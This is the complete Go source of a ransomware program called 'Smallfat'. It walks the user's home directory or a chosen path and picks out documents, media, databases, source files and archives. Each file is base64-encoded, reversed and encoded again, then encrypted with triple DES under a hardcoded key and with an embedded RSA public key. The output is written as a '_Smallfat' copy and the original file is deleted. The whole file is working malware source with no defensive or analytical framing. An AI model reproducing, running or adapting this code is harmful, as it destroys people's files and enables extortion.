package main

import (
	"bufio"
	"bytes"
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"encoding/base64"
	"encoding/pem"
	"flag"
	"github.com/wumansgy/goEncrypt"
	"io/ioutil"
	"os"
	"os/user"
	"path"
	"path/filepath"
	"strings"
	"sync"
)

var (
	ExcludeFile = []string{
		// Text Files
		"doc", "docx", "msg", "odt", "wpd", "wps", "txt",
		// Data files
		"csv", "pps", "ppt", "pptx",
		// Audio Files
		"aif", "iif", "m3u", "m4a", "mid", "mp3", "mpa", "wav", "wma",
		// Video Files
		"3gp", "3g2", "avi", "flv", "m4v", "mov", "mp4", "mpg", "vob", "wmv",
		// 3D Image files
		"3dm", "3ds", "max", "obj", "blend", // Raster Image Files
		"bmp", "gif", "png", "jpeg", "jpg", "psd", "tif", "gif", "ico",
		// Vector Image files
		"ai", "eps", "ps", "svg",
		// Page Layout Files
		"pdf", "indd", "pct", "epub",
		// Spreadsheet Files
		"xls", "xlr", "xlsx",
		// Database Files
		"accdb", "sqlite", "dbf", "mdb", "pdb", "sql", "db",
		// Game Files
		"dem", "gam", "nes", "rom", "sav",
		// Temp Files
		"bkp", "bak", "tmp",
		// Config files
		"cfg", "conf", "ini", "prf",
		// Source files
		"html", "php", "js", "c", "cc", "py", "lua", "go", "java",
		//Compressed file
		"zip", "rar", "7z",
	}

	Remark    = "github.com/RuanLang0777/Smallfat"
	PathName  string
	wg        sync.WaitGroup
	key       = []byte{70, 84, 88, 115, 56, 69, 106, 77, 79, 80, 104, 108, 54, 110, 76, 104, 118, 80, 55, 101, 65, 79, 71, 79}
	ivdes     = []byte{70, 76, 65, 122, 99, 51, 82, 67}
	PublicKey = []byte{45, 45, 45, 45, 45, 66, 69, 71, 73, 78, 32, 80, 85, 66, 76, 73, 67, 32, 75, 69, 89, 45, 45, 45, 45, 45, 10, 77, 73, 73, 66, 73, 106, 65, 78, 66, 103, 107, 113, 104, 107, 105, 71, 57, 119, 48, 66, 65, 81, 69, 70, 65, 65, 79, 67, 65, 81, 56, 65, 77, 73, 73, 66, 67, 103, 75, 67, 65, 81, 69, 65, 116, 120, 108, 90, 103, 54, 70, 43, 79, 83, 43, 74, 110, 102, 106, 85, 90, 55, 72, 113, 10, 81, 76, 49, 77, 106, 47, 77, 84, 87, 85, 109, 57, 88, 109, 80, 76, 110, 67, 114, 114, 100, 69, 101, 112, 51, 54, 101, 53, 48, 72, 116, 81, 113, 112, 122, 76, 56, 104, 89, 84, 80, 84, 71, 68, 87, 49, 66, 48, 100, 111, 48, 117, 53, 69, 75, 68, 112, 90, 87, 71, 90, 86, 70, 79, 10, 53, 74, 118, 83, 79, 89, 54, 79, 105, 108, 102, 51, 88, 119, 104, 79, 56, 97, 77, 51, 122, 114, 110, 111, 116, 82, 99, 50, 100, 117, 84, 54, 77, 116, 109, 57, 105, 79, 116, 112, 85, 97, 98, 119, 108, 52, 81, 116, 108, 78, 70, 84, 67, 98, 70, 87, 80, 121, 43, 104, 52, 103, 100, 109, 10, 47, 65, 78, 107, 121, 87, 83, 84, 104, 72, 109, 120, 119, 72, 115, 53, 106, 101, 112, 111, 116, 120, 80, 72, 84, 81, 78, 84, 105, 74, 53, 103, 115, 76, 76, 50, 78, 106, 88, 51, 74, 103, 53, 80, 116, 89, 118, 55, 104, 101, 102, 90, 121, 57, 69, 71, 72, 76, 48, 68, 52, 48, 88, 51, 10, 121, 108, 119, 118, 113, 84, 80, 57, 67, 72, 78, 66, 117, 112, 122, 57, 83, 77, 118, 52, 75, 47, 120, 104, 56, 78, 97, 117, 102, 67, 77, 115, 105, 57, 108, 103, 51, 86, 75, 52, 50, 72, 79, 48, 97, 75, 113, 65, 84, 69, 103, 67, 80, 48, 84, 78, 56, 105, 43, 88, 83, 88, 65, 79, 10, 121, 97, 119, 81, 105, 83, 82, 55, 48, 68, 106, 55, 82, 81, 116, 51, 101, 122, 99, 103, 122, 84, 55, 72, 115, 111, 70, 53, 121, 43, 52, 55, 48, 84, 81, 72, 66, 82, 77, 68, 117, 43, 78, 72, 65, 87, 87, 52, 110, 56, 68, 100, 47, 48, 114, 99, 113, 116, 82, 103, 67, 50, 72, 74, 10, 103, 119, 73, 68, 65, 81, 65, 66, 10, 45, 45, 45, 45, 45, 69, 78, 68, 32, 80, 85, 66, 76, 73, 67, 32, 75, 69, 89, 45, 45, 45, 45, 45}
)

func init() {
	//获取加密目录
	flag.StringVar(&PathName, "PathName", "", "Specify encrypted directory")
	flag.Parse()
}

func Del_File(fileName string) {
	//删除原文件
	err := os.Remove(fileName)
	if err != nil {
		return
	}
}

func Encrypt(fileName string, key, publicKeyByte []byte) {
	//Base64编码->反转->Base64编码
	file_byte, _ := ioutil.ReadFile(fileName)
	encryption := base64.StdEncoding.EncodeToString(file_byte)
	Reverses := Reverse(encryption)
	Reverses_Encryption := base64.StdEncoding.EncodeToString([]byte(Reverses)) //Base64密文
	//三重DES CBC加密
	DES_Encryption, _ := goEncrypt.TripleDesEncrypt([]byte(Reverses_Encryption), key, ivdes) //DES密文
	//RSA加密
	rsablock, _ := pem.Decode(publicKeyByte)
	publicKey, _ := x509.ParsePKIXPublicKey(rsablock.Bytes)
	keySize, DESSize := publicKey.(*rsa.PublicKey).Size(), len(DES_Encryption)
	pub := publicKey.(*rsa.PublicKey)
	offSet, once := 0, keySize-11
	buffer := bytes.Buffer{}
	for offSet < DESSize {
		endIndex := offSet + once
		if endIndex > DESSize {
			endIndex = DESSize
		}
		bytesOnce, _ := rsa.EncryptPKCS1v15(rand.Reader, pub, DES_Encryption[offSet:endIndex])
		buffer.Write(bytesOnce)
		offSet = endIndex
	}
	RSA_Encryption := buffer.Bytes() //RSA密文
	//写入文件
	content := Remark + "\r\n\r\n" + string(RSA_Encryption)
	baseName := path.Base(fileName)           // 获取文件名+后缀
	ext := path.Ext(baseName)                 // 获取后缀
	name := strings.TrimSuffix(baseName, ext) //获取文件名
	WriteFile, _ := os.OpenFile(name+"_Smallfat"+ext, os.O_WRONLY|os.O_CREATE|os.O_APPEND, 0666)
	buf := bufio.NewWriterSize(WriteFile, len(RSA_Encryption))
	buf.Write([]byte(content))
	buf.Flush()
	WriteFile.Close()
	Del_File(baseName)
}

func Reverse(base64 string) string {
	//反转
	str := []rune(base64)
	for i, j := 0, len(str)-1; i < j; i, j = i+1, j-1 {
		str[i], str[j] = str[j], str[i]
	}
	return string(str)
}

func Home_User() string {
	//获取用户主目录
	uid, _ := user.Current()
	paths := uid.HomeDir
	return paths
}

func Smallfat(fileName string) {
	//排除文件
	if !strings.Contains(fileName, "_Smallfat") {
		baseName := path.Base(fileName)
		ext := path.Ext(baseName)
		for _, SuffixVule := range ExcludeFile {
			Vule := "." + SuffixVule
			if ext == Vule {
				wg.Add(1)
				go func() {
					defer wg.Add(-1)
					Encrypt(fileName, key, PublicKey)
				}()
				wg.Wait()
			}
		}
	}
}

func WalkFunc(fileName string, info os.FileInfo, err error) error {
	//遍历文件
	if info.IsDir() {
		return nil
	}
	Smallfat(fileName)
	return nil

}

func Run(root string) {
	err := filepath.Walk(root, WalkFunc)
	if err != nil {
		return
	}
}

func main() {
	if len(PathName) != 0 {
		Run(PathName)
	} else {
		Run(Home_User())
	}
}
